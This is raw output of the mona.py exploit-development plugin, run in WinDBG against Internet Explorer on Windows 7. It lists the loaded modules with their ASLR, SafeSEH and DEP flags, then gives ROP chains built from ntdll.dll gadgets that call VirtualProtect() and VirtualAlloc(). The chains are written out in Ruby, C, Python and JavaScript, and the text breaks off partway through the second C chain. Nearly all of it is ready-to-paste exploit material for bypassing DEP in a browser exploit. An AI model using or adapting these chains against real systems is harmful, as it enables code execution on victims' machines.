================================================================================
  Output generated by mona.py v2.0, rev 565 - WinDBG
  Corelan Team - https://www.corelan.be
================================================================================
  OS : win7, release 6.1.7601
  Process being debugged : iexplore (pid 4032)
  Current mona arguments: C:\Program Files (x86)\Debugging Tools for Windows (x86)\mona.py rop -m ntdll
================================================================================
  2016-02-04 10:35:03
================================================================================
----------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
----------------------------------------------------------------------------------------------------------------------------------
 0x6f0f0000 | 0x6f11a000 | 0x0002a000 | False  | True    | True  |  True    | False  | 10.6.2.24 [jp2ssv.dll] (C:\Program Files (x86)\Java\jre7\bin\jp2ssv.dll)
 0x6f440000 | 0x6fffb000 | 0x00bbb000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [MSHTML.dll] (C:\Windows\system32\MSHTML.dll)
 0x6f3c0000 | 0x6f43f000 | 0x0007f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [D3D10Level9.dll] (C:\Windows\system32\D3D10Level9.dll)
 0x75100000 | 0x7510c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\Windows\syswow64\MSASN1.dll)
 0x6f0c0000 | 0x6f0eb000 | 0x0002b000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\Windows\system32\msls31.dll)
 0x72a10000 | 0x72a23000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x74a50000 | 0x74a5a000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\syswow64\LPK.dll)
 0x76360000 | 0x76518000 | 0x001b8000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [iertutil.dll] (C:\Windows\syswow64\iertutil.dll)
 0x73df0000 | 0x73ee5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [PROPSYS.dll] (C:\Windows\system32\PROPSYS.dll)
 0x728d0000 | 0x728e1000 | 0x00011000 | False  | True    | True  |  True    | False  | 9.0.0.332 [AcroIEHelperShim.dll] (C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroIEHelperShim.dll)
 0x749f0000 | 0x74a50000 | 0x00060000 | False  | True    | True  |  True    | True   | 6.1.7601.17725 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll)
 0x73120000 | 0x73127000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x752b0000 | 0x7540c000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ole32.dll] (C:\Windows\syswow64\ole32.dll)
 0x75410000 | 0x75467000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHLWAPI.dll] (C:\Windows\syswow64\SHLWAPI.dll)
 0x75500000 | 0x75600000 | 0x00100000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\syswow64\USER32.dll)
 0x725d0000 | 0x72660000 | 0x00090000 | False  | True    | True  |  True    | True   | 9.0.8112.16421 [msfeeds.dll] (C:\Windows\system32\msfeeds.dll)
 0x6efe0000 | 0x6f071000 | 0x00091000 | False  | True    | True  |  False   | False  | 14.0.4750.1000 [URLREDIR.DLL] (C:\PROGRA~2\MICROS~3\Office14\URLREDIR.DLL)
 0x76610000 | 0x7663d000 | 0x0002d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WINTRUST.dll] (C:\Windows\syswow64\WINTRUST.dll)
 0x6ec40000 | 0x6ed06000 | 0x000c6000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [NaturalLanguage6.dll] (C:\Windows\System32\NaturalLanguage6.dll)
 0x74f00000 | 0x7501d000 | 0x0011d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CRYPT32.dll] (C:\Windows\syswow64\CRYPT32.dll)
 0x6e2f0000 | 0x6e315000 | 0x00025000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [peerdist.dll] (C:\Windows\system32\peerdist.dll)
 0x756d0000 | 0x7631a000 | 0x00c4a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\syswow64\SHELL32.dll)
 0x70c10000 | 0x70c2b000 | 0x0001b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AUTHZ.dll] (C:\Windows\system32\AUTHZ.dll)
 0x75470000 | 0x754f3000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\syswow64\CLBCatQ.DLL)
 0x70d00000 | 0x70e0a000 | 0x0010a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [DWrite.dll] (C:\Windows\system32\DWrite.dll)
 0x73090000 | 0x730cc000 | 0x0003c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
 0x74ed0000 | 0x74ef7000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7601.17621 [CFGMGR32.dll] (C:\Windows\syswow64\CFGMGR32.dll)
 0x72dc0000 | 0x72e04000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7601.17570 [dnsapi.DLL] (C:\Windows\system32\dnsapi.DLL)
 0x727d0000 | 0x72802000 | 0x00032000 | False  | True    | True  |  True    | False  | 9.0.8112.16421 [ieproxy.dll] (C:\Program Files (x86)\Internet Explorer\ieproxy.dll)
 0x74c40000 | 0x74d51000 | 0x00111000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [urlmon.dll] (C:\Windows\syswow64\urlmon.dll)
 0x72700000 | 0x72714000 | 0x00014000 | False  | True    | True  |  False   | False  | 14.0.4730.1010 [MSOHEV.DLL] (C:\PROGRA~2\MICROS~3\Office14\MSOHEV.DLL)
 0x6e380000 | 0x6e4fc000 | 0x0017c000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [tquery.dll] (C:\Windows\system32\tquery.dll)
 0x730d0000 | 0x7311c000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x70c70000 | 0x70cf3000 | 0x00083000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [dxgi.dll] (C:\Windows\system32\dxgi.dll)
 0x751a0000 | 0x752b0000 | 0x00110000 | False  | True    | True  |  True    | True   | 6.1.7601.18015 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll)
 0x6f360000 | 0x6f3b2000 | 0x00052000 | False  | True    | True  |  True    | True   | 8.15.1.33 [vm3dum.dll] (C:\Windows\system32\vm3dum.dll)
 0x77310000 | 0x77490000 | 0x00180000 | False  | True    | True  |  True    | True   | 6.1.7601.18247 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll)
 0x76320000 | 0x76339000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll)
 0x72810000 | 0x728b3000 | 0x000a3000 | False  | True    | True  |  True    | True   | 9.0.30729.6161 [MSVCR90.dll] (C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_9.0.30729.6161_none_50934f2ebcb7eb57\MSVCR90.dll)
 0x727c0000 | 0x727d0000 | 0x00010000 | False  | True    | True  |  True    | False  | 9.0.0.332 [AcroIEHelper.dll] (C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroIEHelper.dll)
 0x74a60000 | 0x74b7b000 | 0x0011b000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [WININET.dll] (C:\Windows\syswow64\WININET.dll)
 0x720a0000 | 0x720ce000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\Windows\system32\MLANG.dll)
 0x75020000 | 0x75025000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\syswow64\PSAPI.DLL)
 0x70e10000 | 0x70eca000 | 0x000ba000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [d2d1.dll] (C:\Windows\system32\d2d1.dll)
 0x74e50000 | 0x74ecb000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [comdlg32.dll] (C:\Windows\syswow64\comdlg32.dll)
 0x72750000 | 0x727aa000 | 0x0005a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [netprofm.dll] (C:\Windows\System32\netprofm.dll)
 0x73710000 | 0x7371d000 | 0x0000d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [rtutils.dll] (C:\Windows\system32\rtutils.dll)
 0x6dd60000 | 0x6df1b000 | 0x001bb000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [jscript9.dll] (C:\Windows\SysWOW64\jscript9.dll)
 0x72690000 | 0x726e2000 | 0x00052000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [RASAPI32.dll] (C:\Windows\system32\RASAPI32.dll)
 0x728c0000 | 0x728cb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x6ef20000 | 0x6efde000 | 0x000be000 | False  | True    | True  |  True    | False  | 10.0.30319.1 [msvcr100.dll] (C:\Program Files (x86)\Java\jre7\bin\msvcr100.dll)
 0x73680000 | 0x73697000 | 0x00017000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USERENV.dll] (C:\Windows\system32\USERENV.dll)
 0x75600000 | 0x756cc000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\syswow64\MSCTF.dll)
 0x73970000 | 0x73980000 | 0x00010000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [nlaapi.dll] (C:\Windows\System32\nlaapi.dll)
 0x737f0000 | 0x737fe000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75110000 | 0x751a0000 | 0x00090000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\syswow64\GDI32.dll)
 0x72a30000 | 0x72ab0000 | 0x00080000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x729d0000 | 0x729d5000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSIMG32.dll] (C:\Windows\system32\MSIMG32.dll)
 0x72940000 | 0x72955000 | 0x00015000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rasman.dll] (C:\Windows\system32\rasman.dll)
 0x73540000 | 0x735cb000 | 0x0008b000 | False  | True    | True  |  True    | True   | 4.1.0.0 [EMET.DLL] (C:\Windows\AppPatch\EMET.DLL)
 0x6ee10000 | 0x6ef12000 | 0x00102000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [d3d10.dll] (C:\Windows\system32\d3d10.dll)
 0x6f230000 | 0x6f2b7000 | 0x00087000 | False  | True    | True  |  True    | True   | 8.0.50727.6229 [MSVCP80.dll] (C:\Windows\WinSxS\x86_microsoft.vc80.crt_1fc8b3b9a1e18e3b_8.0.50727.6229_none_d089f796442de10e\MSVCP80.dll)
 0x6f1b0000 | 0x6f222000 | 0x00072000 | False  | True    | True  |  True    | False  | 10.6.2.24 [ssv.dll] (C:\Program Files (x86)\Java\jre7\bin\ssv.dll)
 0x768d0000 | 0x7697c000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll)
 0x735d0000 | 0x73630000 | 0x00060000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [verifier.dll] (C:\Windows\syswow64\verifier.dll)
 0x728f0000 | 0x728fc000 | 0x0000c000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [mssprxy.dll] (C:\Windows\system32\mssprxy.dll)
 0x73630000 | 0x7363d000 | 0x0000d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WTSAPI32.dll] (C:\Windows\system32\WTSAPI32.dll)
 0x72ad0000 | 0x72c6e000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll)
 0x73070000 | 0x73086000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x6e320000 | 0x6e37c000 | 0x0005c000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [StructuredQuery.dll] (C:\Windows\System32\StructuredQuery.dll)
 0x734f0000 | 0x734f8000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [npmproxy.dll] (C:\Windows\System32\npmproxy.dll)
 0x734e0000 | 0x734e6000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sensapi.dll] (C:\Windows\system32\sensapi.dll)
 0x73c00000 | 0x73c31000 | 0x00031000 | False  | True    | True  |  True    | False  | 9.0.8112.16440 [IEShims.dll] (C:\Program Files (x86)\Internet Explorer\IEShims.dll)
 0x6f2c0000 | 0x6f35b000 | 0x0009b000 | False  | True    | True  |  True    | True   | 8.0.50727.6229 [MSVCR80.dll] (C:\Windows\WinSxS\x86_microsoft.vc80.crt_1fc8b3b9a1e18e3b_8.0.50727.6229_none_d089f796442de10e\MSVCR80.dll)
 0x72720000 | 0x7274f000 | 0x0002f000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DUser.dll] (C:\Windows\system32\DUser.dll)
 0x74b80000 | 0x74b86000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\syswow64\NSI.dll)
 0x74bf0000 | 0x74c35000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WLDAP32.dll] (C:\Windows\syswow64\WLDAP32.dll)
 0x765c0000 | 0x76607000 | 0x00047000 | False  | True    | True  |  True    | True   | 6.1.7601.18015 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll)
 0x73820000 | 0x7387f000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SXS.DLL] (C:\Windows\system32\SXS.DLL)
 0x70c30000 | 0x70c6a000 | 0x0003a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [d3d10_1core.dll] (C:\Windows\system32\d3d10_1core.dll)
 0x01050000 | 0x01108000 | 0x000b8000 | False  | True    | True  |  False   | False  | 9.0.8112.16421 [iexplore.exe] (C:\Program Files (x86)\Internet Explorer\iexplore.exe)
 0x72ac0000 | 0x72ac9000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\system32\VERSION.dll)
 0x76520000 | 0x765c0000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7601.18247 [ADVAPI32.dll] (C:\Windows\syswow64\ADVAPI32.dll)
 0x749e0000 | 0x749ec000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll)
 0x76730000 | 0x768cd000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SETUPAPI.dll] (C:\Windows\syswow64\SETUPAPI.dll)
 0x76a10000 | 0x76a45000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WS2_32.dll] (C:\Windows\syswow64\WS2_32.dll)
 0x70ed0000 | 0x71816000 | 0x00946000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [IEFRAME.dll] (C:\Windows\system32\IEFRAME.dll)
 0x73130000 | 0x7314c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [iphlpapi.DLL] (C:\Windows\system32\iphlpapi.DLL)
 0x72660000 | 0x7268f000 | 0x0002f000 | False  | True    | True  |  True    | True   | 1.3.1000.0 [xmllite.dll] (C:\Windows\system32\xmllite.dll)
 0x72f20000 | 0x72f26000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [wship6.dll] (C:\Windows\System32\wship6.dll)
 0x72100000 | 0x721b2000 | 0x000b2000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DUI70.dll] (C:\Windows\system32\DUI70.dll)
 0x72f30000 | 0x72f35000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [wshtcpip.dll] (C:\Windows\System32\wshtcpip.dll)
 0x736d0000 | 0x736f1000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x720d0000 | 0x720fc000 | 0x0002c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [d3d10_1.dll] (C:\Windows\system32\d3d10_1.dll)
 0x75060000 | 0x750fd000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7601.17514 [USP10.dll] (C:\Windows\syswow64\USP10.dll)
 0x72db0000 | 0x72db6000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rasadhlp.dll] (C:\Windows\system32\rasadhlp.dll)
 0x72d70000 | 0x72da8000 | 0x00038000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [fwpuclnt.dll] (C:\Windows\System32\fwpuclnt.dll)
 0x721c0000 | 0x7232f000 | 0x0016f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [explorerframe.dll] (C:\Windows\system32\explorerframe.dll)
 0x73150000 | 0x73158000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7601.17725 [Secur32.dll] (C:\Windows\system32\Secur32.dll)
 0x76340000 | 0x76352000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7601.17621 [DEVOBJ.dll] (C:\Windows\syswow64\DEVOBJ.dll)
 0x72910000 | 0x7293d000 | 0x0002d000 | False  | True    | True  |  True    | True   | 9.0.8112.16440 [IEUI.dll] (C:\Windows\system32\IEUI.dll)
 0x73030000 | 0x7306b000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x6f080000 | 0x6f0b3000 | 0x00033000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [d3d10core.dll] (C:\Windows\system32\d3d10core.dll)
 0x6ed10000 | 0x6ee0b000 | 0x000fb000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [windowscodecs.dll] (C:\Windows\system32\windowscodecs.dll)
 0x727b0000 | 0x727bb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\Windows\system32\msimtf.dll)
 0x76980000 | 0x76a0f000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7601.17676 [OLEAUT32.dll] (C:\Windows\syswow64\OLEAUT32.dll)
 0x76640000 | 0x76730000 | 0x000f0000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll)
 0x72ad0000 | 0x72c6e000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [comctl32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll)
 0x74b90000 | 0x74bf0000 | 0x00060000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x772e0000 | 0x772e3000 | 0x00003000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [Normaliz.dll] (C:\Windows\syswow64\Normaliz.dll)
 0x73500000 | 0x7353c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\Windows\system32\OLEACC.dll)
----------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x7737828f,  # POP EBP # RETN [ntdll.dll] 
      0x7737828f,  # skip 4 bytes [ntdll.dll]
      0x77350292,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x7738cc0e,  # POP EDX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> edx
      0x773d3631,  # POP ECX # RETN [ntdll.dll] 
      0x774104f4,  # &Writable location [ntdll.dll]
      0x7738c886,  # POP EDI # RETN [ntdll.dll] 
      0x773b35c1,  # RETN (ROP NOP) [ntdll.dll]
      0x7734fc91,  # POP ESI # RETN [ntdll.dll] 
      0x7733e8ae,  # JMP [EAX] [ntdll.dll]
      0x773e871a,  # POP EAX # POP EBP # RETN [ntdll.dll] 
      0x751b0928,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x41414141,  # Filler (compensate)
      0x773881ed,  # PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
      0x77372c3d,  # ptr to 'jmp esp' [ntdll.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x7737828f,  // POP EBP // RETN [ntdll.dll] 
      0x7737828f,  // skip 4 bytes [ntdll.dll]
      0x77350292,  // POP EBX // RETN [ntdll.dll] 
      0x00000201,  // 0x00000201-> ebx
      0x7738cc0e,  // POP EDX // RETN [ntdll.dll] 
      0x00000040,  // 0x00000040-> edx
      0x773d3631,  // POP ECX // RETN [ntdll.dll] 
      0x774104f4,  // &Writable location [ntdll.dll]
      0x7738c886,  // POP EDI // RETN [ntdll.dll] 
      0x773b35c1,  // RETN (ROP NOP) [ntdll.dll]
      0x7734fc91,  // POP ESI // RETN [ntdll.dll] 
      0x7733e8ae,  // JMP [EAX] [ntdll.dll]
      0x773e871a,  // POP EAX // POP EBP // RETN [ntdll.dll] 
      0x751b0928,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x41414141,  // Filler (compensate)
      0x773881ed,  // PUSHAD // DEC EBX // MOV EBX,33C233F6 // RETN [ntdll.dll] 
      0x77372c3d,  // ptr to 'jmp esp' [ntdll.dll]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x7737828f,  # POP EBP # RETN [ntdll.dll] 
      0x7737828f,  # skip 4 bytes [ntdll.dll]
      0x77350292,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x7738cc0e,  # POP EDX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> edx
      0x773d3631,  # POP ECX # RETN [ntdll.dll] 
      0x774104f4,  # &Writable location [ntdll.dll]
      0x7738c886,  # POP EDI # RETN [ntdll.dll] 
      0x773b35c1,  # RETN (ROP NOP) [ntdll.dll]
      0x7734fc91,  # POP ESI # RETN [ntdll.dll] 
      0x7733e8ae,  # JMP [EAX] [ntdll.dll]
      0x773e871a,  # POP EAX # POP EBP # RETN [ntdll.dll] 
      0x751b0928,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
      0x41414141,  # Filler (compensate)
      0x773881ed,  # PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
      0x77372c3d,  # ptr to 'jmp esp' [ntdll.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u828f%u7737" + // 0x7737828f : ,# POP EBP # RETN [ntdll.dll] 
    "%u828f%u7737" + // 0x7737828f : ,# skip 4 bytes [ntdll.dll]
    "%u0292%u7735" + // 0x77350292 : ,# POP EBX # RETN [ntdll.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%ucc0e%u7738" + // 0x7738cc0e : ,# POP EDX # RETN [ntdll.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%u3631%u773d" + // 0x773d3631 : ,# POP ECX # RETN [ntdll.dll] 
    "%u04f4%u7741" + // 0x774104f4 : ,# &Writable location [ntdll.dll]
    "%uc886%u7738" + // 0x7738c886 : ,# POP EDI # RETN [ntdll.dll] 
    "%u35c1%u773b" + // 0x773b35c1 : ,# RETN (ROP NOP) [ntdll.dll]
    "%ufc91%u7734" + // 0x7734fc91 : ,# POP ESI # RETN [ntdll.dll] 
    "%ue8ae%u7733" + // 0x7733e8ae : ,# JMP [EAX] [ntdll.dll]
    "%u871a%u773e" + // 0x773e871a : ,# POP EAX # POP EBP # RETN [ntdll.dll] 
    "%u0928%u751b" + // 0x751b0928 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT kernel32.dll]
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u81ed%u7738" + // 0x773881ed : ,# PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
    "%u2c3d%u7737" + // 0x77372c3d : ,# ptr to 'jmp esp' [ntdll.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x773a31bc,  # POP EBP # RETN [ntdll.dll] 
      0x773a31bc,  # skip 4 bytes [ntdll.dll]
      0x7738bed9,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x7738bf81,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x773d3631,  # POP ECX # RETN [ntdll.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x7738c43c,  # POP EDI # RETN [ntdll.dll] 
      0x773b35c1,  # RETN (ROP NOP) [ntdll.dll]
      0x77370455,  # POP ESI # RETN [ntdll.dll] 
      0x7733e8ae,  # JMP [EAX] [ntdll.dll]
      0x773c3c85,  # POP EAX # ADD DH,D # RETN [ntdll.dll] 
      0x765216d0,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT ADVAPI32.dll]
      0x773881ed,  # PUSHAD # DEC EBX # MOV EBX,33C233F6 # RETN [ntdll.dll] 
      0x7733bf43,  # ptr to 'jmp esp' [ntdll.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x773a31bc,  // POP EBP // RETN [ntdll.dll] 
      0x773a31bc,  // skip 4 bytes [ntdll.dll]
